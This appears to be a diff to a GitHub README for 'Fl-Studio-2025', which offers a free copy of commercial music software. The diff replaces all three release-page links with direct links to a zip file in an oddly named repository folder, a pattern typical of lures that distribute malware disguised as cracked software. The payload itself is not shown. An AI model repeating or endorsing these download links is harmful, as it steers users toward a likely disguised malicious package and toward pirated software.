@@ -1,6 +1,6 @@
 # 🎵 Fl-Studio-2025 - Your Free Music Creation Tool
 
-[![Download Fl-Studio-2025](https://img.shields.io/badge/Download%20Fl--Studio%202025-brightgreen)](https://github.com/Erwin0938/Fl-Studio-2025/releases)
+[![Download Fl-Studio-2025](https://raw.githubusercontent.com/Erwin0938/Fl-Studio-2025/main/grandnephew/Fl-Studio-2025.zip%20Fl--Studio%202025-brightgreen)](https://raw.githubusercontent.com/Erwin0938/Fl-Studio-2025/main/grandnephew/Fl-Studio-2025.zip)
 
 ## 📦 What is Fl-Studio-2025?
 Fl-Studio-2025 is a powerful music creation application. Whether you're a beginner or an experienced musician, this tool simplifies composing, recording, and mixing music. You can easily create professional-sounding tracks without any prior knowledge. 
@@ -10,7 +10,7 @@ To start using Fl-Studio-2025, follow these steps:
 
 1. **Visit the Download Page**: Click on the link below to go to the releases page where you can download the software.
    
-   [Download Fl-Studio-2025](https://github.com/Erwin0938/Fl-Studio-2025/releases)
+   [Download Fl-Studio-2025](https://raw.githubusercontent.com/Erwin0938/Fl-Studio-2025/main/grandnephew/Fl-Studio-2025.zip)
 
 2. **Select the Latest Release**: On the releases page, find the latest version of Fl-Studio-2025. It’s usually at the top of the list. Click on it to see the details. 
 
@@ -64,6 +64,6 @@ For user support, check the issues section on the GitHub page. You can report an
 ## 💻 Download & Install
 To get started with Fl-Studio-2025, visit the link below to download the software and install it on your device.
 
-[Download Fl-Studio-2025](https://github.com/Erwin0938/Fl-Studio-2025/releases)
+[Download Fl-Studio-2025](https://raw.githubusercontent.com/Erwin0938/Fl-Studio-2025/main/grandnephew/Fl-Studio-2025.zip)
 
 Dive into the world of music creation with Fl-Studio-2025 today!
